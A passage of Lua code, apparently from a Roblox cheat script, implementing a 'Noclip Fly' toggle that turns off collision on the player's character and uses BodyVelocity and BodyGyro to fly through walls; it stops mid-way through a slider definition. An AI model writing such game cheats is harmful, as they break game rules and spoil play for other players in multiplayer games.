-- FLY
---------------------------------------------------------------------

local fly_on = false
local fly_speed = 70
local BV, BG = nil, nil
local move = {W=false,A=false,S=false,D=false,Q=false,E=false}

UIS.InputBegan:Connect(function(i,gp)
    if gp or not fly_on then return end
    local kc = i.KeyCode
    if kc == Enum.KeyCode.W then move.W=true end
    if kc == Enum.KeyCode.A then move.A=true end
    if kc == Enum.KeyCode.S then move.S=true end
    if kc == Enum.KeyCode.D then move.D=true end
    if kc == Enum.KeyCode.Space then move.Q=true end
    if kc == Enum.KeyCode.LeftControl then move.E=true end
end)

UIS.InputEnded:Connect(function(i)
    local kc = i.KeyCode
    if kc == Enum.KeyCode.W then move.W=false end
    if kc == Enum.KeyCode.A then move.A=false end
    if kc == Enum.KeyCode.S then move.S=false end
    if kc == Enum.KeyCode.D then move.D=false end
    if kc == Enum.KeyCode.Space then move.Q=false end
    if kc == Enum.KeyCode.LeftControl then move.E=false end
end)

Run.Stepped:Connect(function()
    if fly_on then
        local c = char(lp)
        if c then
            for _,v in ipairs(c:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        end
    end
end)

Run.Heartbeat:Connect(function()
    if not fly_on then return end
    local c = char(lp)
    local r = hrp(c)
    if not c or not r then return end
    if not BV then
        BV = Instance.new("BodyVelocity", r)
        BV.MaxForce = Vector3.new(1e6,1e6,1e6)
    end
    if not BG then
        BG = Instance.new("BodyGyro", r)
        BG.MaxTorque = Vector3.new(1e6,1e6,1e6)
        BG.P = 1e5
    end
    BG.CFrame = workspace.CurrentCamera.CFrame
    local dir = Vector3.zero
    if move.W then dir += Vector3.new(0,0,-1) end
    if move.S then dir += Vector3.new(0,0,1) end
    if move.A then dir += Vector3.new(-1,0,0) end
    if move.D then dir += Vector3.new(1,0,0) end
    if move.Q then dir += Vector3.new(0,1,0) end
    if move.E then dir += Vector3.new(0,-1,0) end
    BV.Velocity = workspace.CurrentCamera.CFrame:VectorToWorldSpace(dir) * fly_speed
end)

local function stopFly()
    if BV then BV:Destroy() BV=nil end
    if BG then BG:Destroy() BG=nil end
end

tabShit:CreateToggle({
    Name="Noclip Fly",
    CurrentValue=false,
    Callback=function(v)
        fly_on=v
        if not v then stopFly() end
    end
})

tabShit:CreateSlider({
